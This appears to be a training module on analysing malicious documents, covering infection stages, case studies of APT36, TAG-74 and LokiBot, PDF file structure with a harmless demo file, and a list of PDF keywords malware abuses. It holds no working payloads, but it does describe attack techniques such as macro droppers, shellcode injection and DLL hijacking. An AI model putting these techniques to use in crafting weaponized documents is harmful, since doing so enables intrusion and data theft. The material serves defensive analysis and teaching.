# Introduction

## What is a Malicious Document?

Imagine a world where opening a simple Office document, an Excel sheet, a seemingly harmless PDF, or a helpful CHM file could infect our computer. This is not a hypothetical scenario but a reality that countless individuals and organizations face daily. Welcome to the first section of this module, where we explore various techniques related to document-based malware attacks.

A `malicious document` is a seemingly normal file, such as a Word document, PDF, Excel spreadsheet, or any other type of file, that does not typically execute code by default but has been weaponized with harmful code. When this type of document is opened, the embedded malicious code is executed, potentially leading to various harmful outcomes, such as stealing data, compromising system security, or gaining unauthorized access to a network.

Malicious documents have become a prevalent method for adversaries to compromise systems and steal sensitive information. They are often used to get [initial access](https://attack.mitre.org/tactics/TA0001/) through phishing attacks that may lead to ransomware campaigns and other malicious activities. Understanding how to analyze these documents is crucial for cybersecurity professionals to detect and respond to threats effectively. This knowledge helps prevent data breaches, protect sensitive information, and maintain the integrity of organizational systems.

## How a Document Executes Code?

When a malicious document is opened, it typically leverages various methods to run its embedded malicious code. The process usually begins when a user opens a malicious document, often delivered via email or downloaded from a compromised website.

The GIF demonstrates an example of the steps commonly found in a Malicious Word Document.

![alt text](SWkP2sRc1BoS.gif)

#### STEP 1 - Initial Document Opening

- `User Interaction`: The first step is usually the user interaction. The user opens the malicious document, often delivered via email or downloaded from a compromised website. Common malicious document types include Microsoft Office files that can contain macros (e.g., `.docm`, `.xlsm` and `.pptm`), PDF files, or other format such as RTF (Rich Text Format) that support embedded scripts.

#### STEP 2 - Exploitation of Embedded Code

- `Macros/VBA Scripts (Office Documents)`: In Microsoft Office documents, malicious macros (written in Visual Basic for Applications, VBA) or embedded scripts can be automatically executed if macros are enabled. Attackers often employ social engineering techniques to trick users into enabling macros, such as by saying, "Please enable macros to view the content correctly".
- `Embedded Objects`: The document may contain embedded objects, such as OLE (Object Linking and Embedding) objects, that can execute code when interacted with.
- `JavaScript (PDF Files)`: In PDF documents, JavaScript can be embedded and automatically executed when the document is opened, leading to the execution of malicious code.

#### STEP 3 - Shellcode or Exploit Execution

- `Shellcode Injection`: The embedded script may inject shellcode directly into the current process's memory or another process's memory, effectively bypassing some security mechanisms.
- `Exploitation of Vulnerabilities`: The document may exploit a known vulnerability in the application used to open it (e.g., a buffer overflow in Adobe Reader) to gain control over the execution flow and run arbitrary code.

#### STEP 4 - Dropping and Executing Payload

- `Payload Download`: The script may download additional malware from a remote server, often using HTTP, HTTPS, or DNS communication.
- `Payload Execution`: The document may drop an executable file on the disk or load the payload directly into memory. This payload could be a backdoor, ransomware, keylogger, or another type of malware.
- `Process Injection`: The malicious document may inject its payload into a legitimate process to evade detection and run with the privileges of that process (e.g., explorer.exe).

#### STEP 5 - Establishing Persistence

- `Persistence Mechanisms`: The malware may establish persistence on the victim’s machine by modifying the registry, creating scheduled tasks, or placing files in startup directories.
- `Command and Control (C2) Communication`: The malware often communicates with a remote C2 server to receive further instructions, exfiltrate data, or download additional components.

#### STEP 6 - Execution and Lateral Movement

- `Execution of Malicious Activities`: Once the payload is executed, it carries out its intended malicious activities, such as data exfiltration, file encryption, or spying on the user.
- `Lateral Movement`: If the malware aims to move laterally within a network, it may leverage credentials obtained from the infected system to access other machines.

These documents are typically observed in the initial stage of a malware attack as part of a spearphishing attachment. The screenshot below from the MITRE ATT&CK framework shows [technique](https://attack.mitre.org/techniques/T1566/001/) T1566.001, which is related to spearphishing attachments.

![Maldoc](sHr8u3VDdi9R.png)

MITRE has another [technique](https://attack.mitre.org/techniques/T1204/002/), T1204.002, under user execution related to malicious files. Here, an adversary relies on a user opening the malicious file. Adversaries may employ various forms of masquerading and obfuscated files or information to increase the likelihood that a user will open and successfully execute a malicious file.

![Maldoc](XWgsdm6gbRlq.png)

We'll learn how malware can be embedded within everyday files, and explore how these files, that we might encounter in our daily activities, can be weaponized to infect systems or steal data.

## Learning Objectives

- `Identify and Understand File-Based Malware`: Learn how Office documents, PDFs, and CHM files can be used as vehicles to deliver malware.
- `Recognize the Signs of Infection`: Learn ways to detect when a file might be compromised.
- `Explore Analysis Steps`: Discover techniques and tools to analyze these malicious documents.

## File Classification & Tools

We'll begin by classifying some of the document-based file types that can be used by adversaries as attachments to gain initial access. Understanding these classifications is important for analyzing these files effectively:

- `Office Documents`: These include documents such as MS Word and Excel files, frequently used to deliver malicious macros and scripts. We will explore how macros, embedded objects, and malicious links can turn an innocent-looking spreadsheet or Word document into a weapon.
- `RTF Files`: Understand how RTF files are often used in phishing attacks.
- `PDF Files`: Portable Document Format (PDF) files can contain embedded JavaScript and other types of exploits.
- `CHM Files`: CHM files are often used for help documentation. These less common formats can also be manipulated to deliver malware.

The diagram shown below provides an overview of the different documents and tools used to examine them:

![Maldoc](b1tYZicRo3jz.png)

**Note:** There are many tools that can help with malicious document analysis. This is not a comprehensive list by any means; it's just a list of tools used throughout this module.

# Tools & Setup

Before diving into document analysis, it's essential to set up a secure and efficient environment. The recommended tools, including the setup instructions, are as follows:

- `Virtual Machines (VMs)`: Use VMs to create isolated environments for safe analysis. Tools like VirtualBox and VMware are commonly used.
- `Sandboxing Tools`: Tools such as Cuckoo Sandbox provide automated environments to safely execute and analyze malicious documents.
- `Static Analysis Tools`: Tools like [ExifTool](https://exiftool.org/), [Oletools](https://github.com/decalage2/oletools), Didier Stevens [Suite](https://blog.didierstevens.com/didier-stevens-suite/) and [peepdf](https://pypi.org/project/peepdf/) are essential for examining document metadata and structure without execution.
- `Dynamic Analysis Tools`: Tools like [Fiddler](https://www.telerik.com/fiddler)/ [Wireshark](https://www.wireshark.org/), [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), [x64dbg](https://x64dbg.com/) and various sandboxing solutions help monitor document behavior in real-time.
- `Reverse Engineering Tools`: Tools like [ViperMonkey](https://github.com/decalage2/ViperMonkey), [CyberChef](https://gchq.github.io/CyberChef/), [speakeasy](https://github.com/mandiant/speakeasy) and [dnSpy](https://dnspy.org/) are useful for deobfuscating and understanding malicious macros, scripts, shellcode objects and plugins (such as XLL and WLL).

The required tools are installed within the target (VM) associated with this module. We'll be able to use the tools in the next sections.

For more details on different tools, watch the [Analyzing Phishing Documents 101](https://www.youtube.com/watch?v=a-P3N5P2cCY&t=86s) video (by `@0xdf`) on HackTheBox's youtube channel. This video contains an overview of analyzing malicious documents, and some CTF challenges related to it.

## Best Practices

When analyzing malicious documents, it's important to follow best practices to ensure a thorough and secure analysis. Some of the best practices to consider are mentioned as follows:

- `Use a Safe and Isolated Environment`: Always analyze malicious documents (maldocs) in a virtual machine (VM) or sandbox environment that is completely isolated from the main network to prevent any potential spread of malware. Take a snapshot of the VM before starting the analysis, allowing to quickly revert to a clean state if needed.
- `Try to use Multiple Analysis Tools`: Using a variety of tools is much more effective than relying on just one, as it provides richer details and valuable metadata that a single tool may miss.
- `Analyze Document Metadata`: Analyze the document's metadata for clues about its origin, such as the creation date, author, or software used to create it. Tools like ExifTool can be useful for this purpose.
- `Inspect Macros and Embedded Scripts`: Malicious macros and scripts are often obfuscated. Use tools like `olevba` or `CyberChef` to deobfuscate them and understand the script's logic.
- `Document Findings and Indicators of Compromise (IOCs)`: Keep detailed notes on all observed behaviors, file modifications, network activity, and other indicators.
- `Perform Comparative Analysis`: If possible, compare the maldoc with known malicious samples to identify similarities or new tactics, techniques, and procedures (TTPs).

In addition to these best practices, it is important for us to stay informed and actively share our knowledge about phishing and harmful documents with our colleagues.

- `Educate and Train Users`: Conduct regular training sessions to educate employees and users about the risks associated with malicious documents and how to spot phishing attempts.

In a [blog post](https://www.anomali.com/blog/anomali-cyber-watch-conti-ransomware-attack-iran-sponsored-apts-new-android-rat-russia-sponsored-gamaredon-and-more) from Anomali, the analyst mentions `Education is the best defense`. Education and awareness are essential in recognizing and preventing spearphishing attacks, empowering individuals to identify suspicious attachments and not open them directly.

![](wtNy3SrjT3BB.png)

- `Avoid Opening Unknown Attachments`: If we receive an unexpected or suspicious attachment, it is recommended to not open it until we've confirmed its authenticity with the sender.

One of the best headings in a [blog post](https://redcanary.com/blog/incident-response/malicious-excel-macro/) from RedCanary which says " `Don't be an enabler`". Whenever we see an unknown suspicious email asking us to enable macros, we shall remember this heading. Instead of opening the documents directly, learn how to analyze these samples safely.

![](VYtqvwR2ytcI.png)

Always be cautious when opening documents from unknown sources. Stay protected with cybersecurity best practices.

By the end of this module, we'll not only be aware of the risks posed by these common file types but also be inspired to dive deeper into the investigation process. We'll gain the skills to protect ourselves and our organization from these threats and develop a critical mindset that questions the safety of every file we encounter.

* * *

Click on `Mark Complete & Next` to proceed to the next section.


# Real World Case studies

## Introduction

Several adversary groups leverage malicious document attachments in phishing emails as a common attack vector. These documents, often crafted to appear legitimate, contain embedded scripts, macros, or exploits that execute malware upon opening.

In the MITRE ATT&CK framework, `procedures` represent the specific methods or actions an adversary employs to execute techniques or sub-techniques. For instance, the [Spearphishing attachment](https://attack.mitre.org/techniques/T1566/001/) technique page on MITRE ATT&CK provides examples of relevant procedures adversaries use to deliver malicious documents as initial infection vectors. A procedure could include an adversary embedding a malicious macro or exploit within a document attached to a phishing email, aiming to compromise the victim upon opening the file.

The screenshot below from the Spearphishing attachment sub-technique page of MITRE ATT&CK framework shows some examples of relevant procedures employed by adversaries.

![Maldoc](hWyqKkM79a3g.png)

A community-driven centralized tracker in form of `Google Sheets` is used to track and document details related to different threat groups. This can be checked on [https://apt.threattracking.com](https://apt.threattracking.com)

You can perform search in all tabs of this spreadsheet for different threat actors, target, toolsets and respective names on different platforms such as on MITRE, Mandiant, Microsoft or Crowdstrike etc.

* * *

## Case Studies

In this section, we will go through some real-world attack case-studies where malicious documents are used by threat actors for initial access.

### Malicious Office Document (APT36)

APT36 (or Transparent Tribe) is a threat group (that has been active since at least 2013) which is known to leverage spearphishing with malicious Office document attachments for initial compromise. Here's an example of a procedure where APT36 used Office documents with macros for initial access.

![Maldoc](8QPq2sAjL7Lq.png)

> **Source**: ( [Trendmicro](https://www.trendmicro.com/en_ie/research/22/a/investigating-apt36-or-earth-karkaddans-attack-chain-and-malware.html)) Attack chain observed in APT36 or Earth Karkaddan’s campaign.

The group sends spear-phishing emails with a variety of lures to deceive victims. Once the victim downloads the malicious macro, a hidden embedded executable dropper is decrypted and saved to a hardcoded path prior to it executing in the machine. Once the executable file is executed, it will run [Crimson RAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.crimson) malware to communicate with its command-and-control (C&C) server to download other malware or exfiltrate data.

The MITRE ATT&CK group page related to this threat actor is as follows:

[https://attack.mitre.org/groups/G0134/](https://attack.mitre.org/groups/G0134/)

### Malicious CHM File (TAG-74)

Recorded Future's Insikt Group, which is [tracking](https://www.recordedfuture.com/research/multi-year-chinese-apt-campaign-targets-south-korean-academic-government-political-entities) the activity under the alias `TAG-74`, said it is a state-sponsored adversary and poses a significant threat to academic, aerospace and defense, government, military, and political entities in South Korea, Japan, and Russia.". Their tactics, techniques, and procedures (TTPs) include the use of malicious `.chm` files that trigger a DLL search order hijacking execution chain to gain access to the victim.

The procedure example shown in the screenshot below illustrates the use of malicious CHM by TAG-74.

![Maldoc](kF69WGFHlnXT.png)

> **Source**: ( [Recorded Future](https://www.recordedfuture.com/research/multi-year-chinese-apt-campaign-targets-south-korean-academic-government-political-entities)) Typical infection chain observed in TAG-74 campaign targeting South Korea.

In this case study, the Compiled HTML (.chm) file was likely distributed via spearphishing. This `.chm` file consists of the following components:

- An HTML file is used to display decoy document, decompile `.chm` file, and rest of files and execute them.
- Embeds a legitimate executable vulnerable to DLL search order hijacking.
- A malicious DLL is loaded through the accompanying legitimate executable via DLL search order hijacking.

### Malicious RTF File (LokiBot)

First reported in 2015, [LokiBot](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-266a) is a well-known information-stealing malware often distributed through spam campaigns that target various sectors, including finance, technology, and government. It is classified as a credential harvester, infostealer, and remote access trojan (RAT). It employs Trojan malware to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials.

An example of the LokiBot spreading campaign, where documents were weaponized with [CVE-2018-0802](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2018-0802) exploit payloads using the Office embedded formula editor `EQNEDT32.EXE`, is shown in the screenshot below.

![Maldoc](UO8WpiPZozzs.png)

> **Source**: ( [Zscaler](https://www.zscaler.com/blogs/security-research/cve-2017-8570-and-cve-2018-0802-exploits-being-used-spread-lokibot)) CVE-2018-0802 exploit being used to spread LokiBot

The object data of the document file drops an executable file into the user's `%TEMP%` directory. The malicious executable belongs to the [LokiBot family](https://malpedia.caad.fkie.fraunhofer.de/details/apk.lokibot), which is known to steal users' private data, including stored credentials and cryptocurrency wallets. This information is sent to the actor-controlled Command & Control ( [C&C](https://attack.mitre.org/tactics/TA0011/)) server.

* * *

These threat groups demonstrate how effective malicious document attachments can be in phishing campaigns. Each of these examples highlights different document types—Office documents, CHM files, and RTF files—as effective tools in phishing campaigns for cyber espionage and financial theft. By leveraging these document formats, threat actors can exploit user trust and gain initial access to targeted systems.

Click on `Mark Complete & Next` to proceed to the next section.


# PDF Internals

## Overview

According to Wikipedia, the Portable Document Format (PDF) is a file format developed by `Adobe` in 1992 to present documents, including text formatting and images, in a manner independent of application software, hardware, and operating systems.

PDFs are widely used for document distribution because of their consistent appearance across different devices and platforms. However, their versatility and widespread use make them an attractive target for malicious actors. Malicious PDFs can exploit vulnerabilities in PDF readers, embed hyperlinks to malicious scripts, or deliver payloads to compromise systems.

In this section, we will explore the structure of PDF files, common attack vectors, and tools and techniques for analyzing potentially malicious PDFs.

## PDF Format

Understanding the internal structure of a PDF file is important for effective analysis. A typical PDF consists of several components, as mentioned below:

- `Header`: The beginning of a PDF file, containing the version number (e.g., `%PDF-1.7`).
- `Body`: Contains objects such as text, images, and embedded files. Objects are defined by numbers and include dictionaries, streams, and arrays.
- `Cross-Reference Table (xref)`: Maps object numbers to their byte offset in the file.
- `Trailer`: Marks the end of the file and contains a reference to the `xref` table.

The diagram below represents a basic structure of a PDF file.

![PDF-Analysis](bA1RHnbZJfqS.png)

The structure shown in the diagram represents a demo PDF file, which is stored at the location `C:\Tools\MalDoc\PDF\Demo\HTB-demo.pdf` within the target (VM) machine. We'll discuss these components to understand the structure of a PDF file in detail. The first component is the `Header`.

### Header

A PDF file starts with the PDF header. If we open the PDF file in any text viewer, we can see that the first line is a `Header` which shows the minimum version of the PDF [specification](https://opensource.adobe.com/dc-acrobat-sdk-docs/pdfstandards/PDF32000_2008.pdf).

```pdf
%PDF-1.7

```

### Body

The body of a PDF file contains the main content of the document. This content is stored in a series of objects. Each object can be of various types, including dictionaries, streams, arrays, and more. These objects define the text, images, fonts, annotations, and other elements of the document.

For example, if we view the demo PDF in a text editor, we can see the objects listed as follows:

```pdf
%PDF-1.7

1 0 obj
<< /Type /Catalog
   /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages
   /Kids [3 0 R]
   /Count 1 >>
endobj

3 0 obj
<< /Type /Page
   /MediaBox [0 0 595 842]
   /Parent 2 0 R
   /Resources
     << /Font
        << /F1 6 0 R
           /F2 5 0 R >>
        /XObject
        << /Im1 7 0 R >>
     >>
   /Contents 4 0 R
   /Annots [8 0 R] >>
endobj

4 0 obj
<< /Length 120 >>
stream
BT
  /F1 39 Tf
  70 700 Td
  (HackTheBox Demo PDF) Tj
ET
BT
  /F2 29 Tf
  88 493 Td
  (Click Me >>) Tj
ET
q
  100 0 0 100 247.5 450 cm
  /Im1 Do
Q
endstream
endobj

5 0 obj
<< /Type /Font
   /Subtype /Type1
   /BaseFont /Helvetica >>
endobj

6 0 obj
<< /Type /Font
   /Subtype /Type1
   /BaseFont /Helvetica-Bold >>
endobj

7 0 obj
<< /Type /XObject
   /Subtype /Image
   /Width 10
   /Height 10
   /ColorSpace /DeviceRGB
   /BitsPerComponent 8
   /Filter /ASCIIHexDecode
   /Length 300 >>
stream
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF98FF9898FF9898FF9898FF9898FF9898FF9898FF9898FF98FFFFFFFFFFFF98FF98FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000FFFFFF98FF98FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000FFFFFF98FF98FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000FFFFFF98FF98FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000FFFFFF98FF98FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000FFFFFF98FF9898FF9898FF9898FF9898FF9898FF9898FF9898FF98FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
endstream
endobj

8 0 obj
<< /Type /Annot
   /Subtype /Link
   /Rect [247.5 450 347.5 550]
   /Border [0 0 0]
   /A << /S /URI
        /URI (https://hackthebox.com/) >> >>
endobj

xref
0 9
0000000000 65535 f
0000000009 00000 n
0000000056 00000 n
0000000111 00000 n
0000000270 00000 n
0000000424 00000 n
0000000492 00000 n
0000000704 00000 n
0000000795 00000 n
trailer
<< /Size 9
   /Root 1 0 R >>
startxref
879
%%EOF

```

In the body of a PDF document, there are multiple objects called `indirect objects`. These objects can be labeled so that other objects can refer to them. This gives the object a unique object identifier (object ID) by which other objects can refer to it. The object identifier consists of two parts:

- `A positive integer object number`: Indirect objects are often numbered sequentially within a PDF file, but this is not required; object numbers may be assigned in any arbitrary order.
- `A non-negative integer generation number`: In a newly created file, all indirect objects have generation numbers of 0. Together, the combination of an object number and a generation number uniquely identifies an indirect object. The object retains the same object number and generation number throughout its existence, even if its value is modified.

To understand the logical structure of different objects in a PDF file, which is a hierarchical structure, we need to look into the trailer to identify the root object. In this example, object 1 is the root. Then, we can see that object 2 is the child of object 1, and object 3 is the child of object 2. Finally, objects 4, 5, 6, 7, and 8 are children of object 3.

The image below shows the logical structure of a PDF file. We are referencing the demo PDF file (stored at the location `C:\Tools\MalDoc\PDF\Demo\HTB-demo.pdf`) in this image.

![PDF-Analysis](gBJ7AVXMypAc.png)

The objects refer to other objects for different purposes. For example, object 3 refers to object 8 for the `URI`.

### Cross-Reference Table (xref)

The cross-reference table, or `xref` table, is an important part of a PDF file. It contains a list of all objects in the file along with their byte offsets from the beginning of the file. This allows a PDF reader to quickly locate and access objects.

This table starts with the keyword `xref` and consists of a series of entries. Each entry contains the byte offset of the object, the generation number, and a keyword indicating the object’s status ( `n` for normal in-use and `f` for free).

The snippet below shows an example of a cross-reference table:

```pdf
xref
0 9
0000000000 65535 f
0000000009 00000 n
0000000056 00000 n
0000000111 00000 n
0000000270 00000 n
0000000424 00000 n
0000000492 00000 n
0000000704 00000 n
0000000795 00000 n

```

In this example, the `xref` table lists the byte offsets for objects 0 to 9. The first entry (object 0) is a free object, while the others are in use.

### Trailers

The trailer marks the end of a PDF file and provides a way for the PDF reader to quickly access essential information, including the location of the cross-reference table, the root object of the document (usually the catalog), and other important metadata.

An example of the trailer is as follows:

```pdf
trailer
<< /Size 9
   /Root 1 0 R >>
startxref
879
%%EOF

```

In the example shown above, the trailer keyword marks the beginning of the trailer dictionary. The trailer dictionary, enclosed in double angle brackets `<< >>`, contains references to essential parts of the PDF, ensuring the document can be properly accessed and navigated. For example, the `/Size` entry indicates the total number of indirect objects in the PDF file, i.e., 9 indirect objects in the file. The `/Root 1 0 R` indicates that the catalog object is located at object number 1. Then the `startxref` value specifies that the cross-reference table starts at byte `879` from the beginning of the file. Finally, the `%%EOF` keyword signifies the end of the PDF file.

* * *

Click on `Mark Complete & Next` to proceed to the next section.


# PDF Parsing & Objects

## How a PDF is parsed by PDF Readers?

When a PDF file is opened by a PDF reader, it starts by reading the PDF `header` to determine the PDF version, e.g., `%PDF-1.7`. This informs the PDF reader about the version of the PDF specification to use. The PDF reader looks for the `trailer` dictionary to determine the location of the root object (the catalog) and the location of the cross-reference table within the file (startxref), i.e., at `879` byte position in this document, ensuring the reader knows where everything is.

The reader then locates the `cross-reference` table, which lists the byte offsets of each object in the file (i.e., from object 1 to 9 in this example). Using this table, the reader can quickly find objects such as fonts, images, and pages without having to parse the entire file sequentially. Each page is rendered by interpreting content streams that describe the text, images, and graphics to be displayed.

The reader interprets the objects based on their types. For example, some common types are mentioned as follows:

- `Catalog (Type: /Catalog)`: Points to the root of the document structure.
- `Font (Type: /Font)`: Specifies fonts used in the document.
- `Image (Type: /XObject, Subtype: /Image)`: Contains image data to be rendered.
- `Pages (Type: /Pages)`: Contains a list of pages.

The reader then processes the page objects and performs all cross-references to the indirect objects in order to interpret the content streams, which describe the text, images, and graphics to be displayed. It then applies resources such as fonts, images, and color spaces as specified in the page's resource dictionary.

The image below shows a basic overview of how a PDF is parsed by the PDF Reader:

![PDF-Analysis](TVD9lqHGdHnT.png)

## Indirect Objects

The body of a PDF file contains the main content of the document. This content is stored in a series of objects. Each object can be of various types, including dictionaries, streams, arrays, and more. Some of the objects are mentioned as follows:

- dictionary
- stream
- boolean
- integer
- real
- name
- string
- array
- null

Objects are the building blocks of a PDF and reside in the body segment of a PDF document. Any item present inside a PDF document has an associated object as well. Commercial applications like Adobe Acrobat PDF Reader parse these objects and data to render the document in the viewer.

As shown in the image below, a PDF file can have `n` number of objects, and each object holds data such as text, images, fonts, annotations, and other elements of the document.

![PDF-Analysis](OmPZ3BK4y7ur.png)

Objects in the body are defined by a `unique object number` and a `generation number`, followed by the keyword `obj`. The object number is the numeric identifier of the object, and it's how the object is referred to by other objects. The second number represents the version of the object. PDFs allow objects to be modified and saved multiple times, and each time, the version number is incremented by 1. By default, most PDF readers show the highest or latest version number of an object. However, when you're performing an analysis and find a malicious object, look to see if there are any previous versions. Some malicious PDFs have been found to have various iterations of the attack code saved in different versions of an object, which gives an interesting view of how the attacker works. The object definition starts with the keyword `obj` and ends with the keyword `endobj`.

Here's an example of indirect object within a PDF Document.

```pdf
1 0 obj
  << /Pages 4 0 R
     /Type /Catalog
  >>
endobj

```

If we break down this example, we can see that the `1 0 obj` represents the object number, generation number, and the start of the object definition. Then we have the dictionary content which is enclosed inside the `<< ... >>` key-value pair structure. Here, `/Type /Catalog` specifies the type of this object. In this case, it is a `/Catalog` object, which is a required top-level object in every PDF file that defines the document structure. The `/Pages 4 0 R` refers to another object `(4 0 R)` that defines the pages tree. `R` stands for "reference," indicating that object `4` is being referenced. This means that the indirect object `1 0` references `4 0`.

## Important Types of Objects

While going through the objects, we should always inspect different types of objects, such as:

- Catalog Object
- Dictionary Object
- Stream Object

These object types are particularly significant, as they often play roles in carrying out malicious actions or hiding malicious code.

### Catalog Object

The Catalog Object acts as a kind of table of contents (TOC) for the document. The primary reason to examine the catalog object is that it may contain an `/OpenAction` keyword, which causes actions to be automatically performed when the document is opened, such as the execution of malicious code.

For example, the catalog object mentioned below contains an `/OpenAction` keyword, which refers to another indirect object `4 0`.

```pdf
obj 2 0
 Type: /Catalog
 Referencing: 4 0 R, 5 0 R, 6 0 R, 7 0 R

  <<
    /OpenAction 4 0 R
    /AcroForm 5 0 R
    /Pages 6 0 R
    /Names 7 0 R
    /Type /Catalog
    /Version /1.5
  >>

```

### Dictionary Object

The Dictionary Object is an associative table containing pairs of objects, known as the dictionary’s entries. The first element of each entry is the key, and the second element is the value.

- The value can be any kind of object, including another dictionary.
- A dictionary entry whose value is null is equivalent to an absent entry.
- A dictionary is written as a sequence of key-value pairs enclosed in double angle brackets ( `<<…>>`).

```pdf
<<
/Type /Example
/Subtype /DictionaryExample
/Version 0.01
/IntegerItem 12
/StringItem (a string)
/Subdictionary << /Item1 0.4
				/Item2 true
				/LastItem (not!)
				/VeryLastItem (OK)
			 >>
>>

```

- The above code defines a dictionary. Simply put, anything enclosed in `<<` and `>>` is considered to be a dictionary.
- A slash character ( `/`) introduces a name. The slash is not part of the name but is a prefix indicating that the following sequence of characters constitutes a name.
- Dictionary objects are the main building blocks of a PDF document. They are commonly used to collect and tie together the attributes of a complex object, such as a font or a page of the document, with each entry in the dictionary specifying the name and value of an attribute.
- By convention, the `/Type` entry of such a dictionary identifies the type of object the dictionary describes. A `/Subtype` entry (sometimes abbreviated `S`) is used to further identify a specialized subcategory of the general type.
- Depending on the type of object, there is a set of entries supported by an object. We will see a list of entries supported by a stream object in the following section.

### Stream Object

A Stream Object is a sequence of bytes that can hold bulk data, such as images, fonts, or compressed and obfuscated code (e.g., JavaScript). Malicious streams often contain encoded or compressed payloads, which may include shellcode, scripts, or other code intended for exploitation.

A stream consists of a dictionary followed by zero or more bytes bracketed between the keywords `stream` and `endstream`. A Stream Object may contain data that is not necessarily always malicious. Embedded programs or scripts are often stored in a compressed stream object, which is why it is always worth checking out.

For example, here's an object that contains `/Filter /FlateDecode`, which means it is compressed.

```pdf
7 0 obj
<<
   /Filter /FlateDecode
   /Length 400
>>
stream
    <encoded data>
endstream
endobj

```

It contains a stream of encoded data. We have the features in the necessary tools to decode this data, which we'll discuss in detail.

All streams must be indirect objects and the stream dictionary must be a direct object. The table below shows the supported entries for the object of type stream:

| KEY | TYPE | VALUE |
| --- | --- | --- |
| `Length` | integer | (Required) This specifies the number of bytes from the beginning of the line following the keyword `stream` to the last byte just before the keyword `endstream`. |
| `Filter` | name or array | (Optional) The name of a filter to be applied in processing the stream data found between the keywords `stream` and `endstream`, or an array of such names. Multiple filters should be specified in the order in which they are to be applied. |
| `DecodeParms` | dictionary or array | (Optional) A parameter dictionary or an array of such dictionaries, used by the filters specified by `Filter`. |
| `F` | file specification | (Optional; PDF 1.2) The file containing the stream data. |
| `FFilter` | name or array | (Optional; PDF 1.2) The name of a filter to be applied in processing the data found in the `stream`’s external file, or an array of such names. |
| `FDecodeParms` | dictionary or array | (Optional; PDF 1.2) A parameter dictionary, or an array of such dictionaries, used by the filters specified by `FFilter`. |
| `DL` | integer | (Optional; PDF 1.5) A non-negative integer representing the number of bytes in the decoded (defiltered) stream. It can be used to determine, for example, whether enough disk space is available to write a stream to a file. |

Analysts should check for compressed streams or those containing encoded data, as well as suspicious dictionary entries, such as filters that obscure content.

### Stream Filter

A stream filter is an optional part of the specification of a stream, indicating how the data in the stream must be decoded before it is used. For example, if a stream has an `ASCIIHexDecode` filter, an application reading the data in that stream will transform the ASCII hexadecimal-encoded data in the stream into binary data.

Some filters may take parameters to control how they operate. These optional parameters are specified by the `DecodeParms` entry in the stream’s dictionary (or the `FDecodeParms` entry if the stream is external).

PDF supports a standard set of filters that fall into two main categories:

- `ASCII filters` enable decoding of arbitrary 8-bit binary data that has been encoded as ASCII text
- `Decompression filters` enable decoding of data that has been compressed.

The standard filters are summarized in the table below, which also indicates whether they accept any optional parameters

| FILTER NAME | PARAMETERS? | DESCRIPTION |
| --- | --- | --- |
| `ASCIIHexDecode` | no | Decodes data encoded in an ASCII hexadecimal representation, reproducing the original binary data. |
| `ASCII85Decode` | no | Decodes data encoded in an ASCII base-85 representation, reproducing the original binary data. |
| `LZWDecode` | yes | Decompresses data encoded using the LZW (Lempel-Ziv-Welch) adaptive compression method, reproducing the original text or binary data. |
| `FlateDecode` | yes | (PDF 1.2) Decompresses data encoded using the zlib/deflate compression method, reproducing the original text or binary data. |
| `RunLengthDecode` | no | Decompresses data encoded using a byte-oriented run-length encoding algorithm, reproducing the original text or binary data (typically monochrome image data, or any data that contains frequent long runs of a single byte value). |
| `CCITTFaxDecode` | yes | Decompresses data encoded using the CCITT facsimile standard, reproducing the original data (typically monochrome image data at 1 bit per pixel). |
| `JBIG2Decode` | yes | (PDF 1.4) Decompresses data encoded using the JBIG2 standard, reproducing the original monochrome (1 bit per pixel) image data (or an approximation of that data). |
| `DCTDecode` | yes | Decompresses data encoded using a DCT (discrete cosine transform) technique based on the JPEG standard, reproducing image sample data that approximates the original data. |
| `JPXDecode` | no | (PDF 1.5) Decompresses data encoded using the wavelet-based JPEG2000 standard, reproducing the original image data. |
| `Crypt` | yes | (PDF 1.5) Decrypts data encrypted by a security handler, reproducing the original data as it was before encryption. |

* * *

Click on `Mark Complete & Next` to proceed to the next section.


# Malicious PDF Documents

## Introduction

Malicious documents can take many forms, each exploiting different aspects of document processing software. PDF documents are among the most common types used in phishing campaigns. These documents can embed JavaScript, which can be used to exploit vulnerabilities in PDF readers.

In older, unpatched versions of Acrobat Reader, a PDF file can directly execute embedded JavaScript via MSHTA, leading to the launch of PowerShell for process injection. Newer versions of Acrobat Reader no longer allow direct JavaScript execution within PDFs. Instead, the latest PDF documents contain hyperlinks that redirect the user to a malicious website where the script is downloaded. From there, the infection process continues similarly.

The image shown below gives an overview of the infection process:

![PDF-Analysis](R1R1rx8UtjnA.png)

A PDF file can contain many embedded files, stream objects, malicious JavaScript code, etc. Therefore, it is important to examine the file before interacting with it.

## Suspicious Keywords

While going through the objects, always look for the use of suspicious keywords present in the objects. Keywords are actions and elements that control how a PDF works. PDF files use a variety of keywords to define the properties and behaviors of objects. These keywords specify various document settings, actions, and metadata.

Some of the most commonly encountered risky PDF keywords are as follows:

- `/OpenAction (/AA)`: This specifies an action to be performed when the document is opened. Malicious actors use this to automatically execute malicious scripts without user interaction.
- `/Launch`: This keyword specifies an action to launch an external application or open a file. This can be used maliciously to execute embedded malware or scripts.
- `/JavaScript (/JS)`: Specifies a JavaScript action, while `/JS` defines the actual script to be executed. Malicious JavaScript can perform a variety of harmful actions, such as downloading malware or stealing information.
- `/Names`: This includes the names of files that will likely be referred to by the PDF itself. Malicious documents often contain embedded files that are intended to be dropped on the system. The names of these files can be found here. Inspect any entries under `/Names` carefully.
- `/EmbeddedFile`: Used to embed files within the PDF. Malicious PDFs often use this to include executable files or other payloads.
- `/URI /SubmitForm`: Defines an action to submit form data to a specified URL. This can be used to steal user information or send data to a malicious server.

## PDF Analysis Tools

